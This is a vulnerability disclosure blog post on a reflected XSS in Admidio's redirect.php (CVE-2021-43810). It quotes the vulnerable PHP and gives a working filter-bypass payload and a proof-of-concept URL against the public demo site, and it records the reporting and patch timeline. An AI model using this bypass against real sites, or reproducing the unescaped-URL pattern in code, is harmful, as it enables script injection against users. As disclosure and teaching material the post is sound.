---
layout: post
date: 2021-12-05 19:31:00
title: "Reflected XSS in admidio/admidio"
categories: Research
tags: [Research, XSS, CVE]
author:
  - Jeongwon Jo

---
## Description

> The [Admidio](https://github.com/admidio/admidio) is a free open source user management system for websites of organizations and groups. And this Reflected XSS vulnerability occurs because [redirect.php](https://github.com/Admidio/admidio/blob/master/adm_program/system/redirect.php) does not properly validate the value of the url parameter. Using javascript: throws an error in parsing the url. But I bypassed it using javascript://%0A.

```php
<?php
/**
 ***********************************************************************************************
 * Redirect to chosen url
 *
 * @copyright 2004-2021 The Admidio Team
 * @see https://www.admidio.org/
 * @license https://www.gnu.org/licenses/gpl-2.0.html GNU General Public License v2.0 only
 ***********************************************************************************************
 */

/******************************************************************************
 * Parameters:
 *
 * url - url that should be redirected
 *
 *****************************************************************************/

require_once(__DIR__ . '/common.php');

// Initialize and check the parameters
$getUrl = admFuncVariableIsValid($_GET, 'url', 'string', array('requireValue' => true));

if (filter_var($getUrl, FILTER_VALIDATE_URL) === false) {
    $gMessage->show($gL10n->get('SYS_REDIRECT_URL_INVALID'));
    // => EXIT
}

// create html page object
$page = new HtmlPage('admidio-redirect', $gL10n->get('SYS_REDIRECT'));

// add special header for automatic redirection after x seconds
$page->addHeader('<meta http-equiv="refresh" content="' . $gSettingsManager->getInt('weblinks_redirect_seconds') . '; url=' . $getUrl . '">');

// Counter zählt die sekunden bis zur Weiterleitung runter
$page->addJavascript(
    '
    /**
     * @param {bool} init
     */
    function countDown(init) {
        if (init || --document.getElementById("counter").firstChild.nodeValue > 0) {
            window.setTimeout("countDown()", 1000);
        }
    };
    countDown(true);'
);

// Html des Modules ausgeben
$page->addHtml(
    '<p class="lead">' .
        $gL10n->get(
            'SYS_REDIRECT_DESC',
            array($gCurrentOrganization->getValue('org_longname'),
            '<span id="counter">' . $gSettingsManager->getInt('weblinks_redirect_seconds') . '</span>',
            '<strong>' . $getUrl . '</strong>',
            '<a href="' . $getUrl . '" target="_self">',
            '</a>')
        ) .
    '</p>'
);

// show html of complete page
$page->show();
// https://github.com/Admidio/admidio/blob/master/adm_program/system/redirect.php#L57
```
Looking at the code above, you can see that the value of the `url` parameter is taken from line 22 and inserted as the `href` value of the a tag in line 57.

![](https://github.com/blogpocas/DATA/blob/main/BB/admidio/Reflected%20XSS/2.png?raw=true)

I just passed `javascript:alert(document.domain)` as the value of the `url` parameter, but I could see an error occurred in the url parser.

![](https://github.com/blogpocas/DATA/blob/main/BB/admidio/Reflected%20XSS/1.png?raw=true)

So, I just successfully bypassed using `javascript://%250aalert(document.domain)`, and when I clicked the `here` button, I checked that `XSS` occurred.


---
## Proof of Concept

```txt
1. Open the https://www.admidio.org/demo_en/adm_program/system/redirect.php?url=javascript://%250aalert(document.domain)
2. If you click the `here`, you can see that occur a xss!
```
<style>
    .myvideo {
        width: auto;
        max-width: 100%;
        height: auto;
    }
</style>
<video class="myvideo" controls preload>
    <source src="https://github.com/blogpocas/DATA/blob/main/BB/admidio/Reflected%20XSS/xss.mov?raw=true" type="video/mp4">
</video>


---
## Reporting Timeline

- 2021-12-05 18h 22m : Reported this issue via the [huntr](https://www.huntr.dev/)
- 2021-12-07 01h 52m : Validated this issue by [Markus Faßbender](https://github.com/Fasse)
- 2021-12-08 05h 28m : Patched by [Markus Faßbender](https://github.com/Fasse)
- 2021-12-08 05h 30m : Assign a CVE-2021-43810

---
## Reference

- [Github Commit](https://github.com/Admidio/admidio/commit/fcb0609abc1d2f65bc1377866bd678e5d891404b)
- [Huntr](https://www.huntr.dev/bounties/4eb6d581-338c-4ff7-850d-733194d6c3a8/)
- [Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43810)
- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-43810)

---